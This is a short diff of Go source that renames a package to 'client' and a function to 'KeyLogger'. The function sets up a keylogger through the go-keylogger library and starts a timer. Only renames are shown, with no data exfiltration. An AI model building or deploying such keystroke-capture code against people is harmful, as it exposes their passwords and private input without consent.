@@ -1,4 +1,4 @@
-package main
+package client
 
 import (
 	"os"
@@ -7,7 +7,7 @@ import (
 	keylogger2 "github.com/kindlyfire/go-keylogger"
 )
 
-func Logger() {
+func KeyLogger() {
 	keylogger := keylogger2.NewKeylogger()
 
 	startTimer := time.Now()
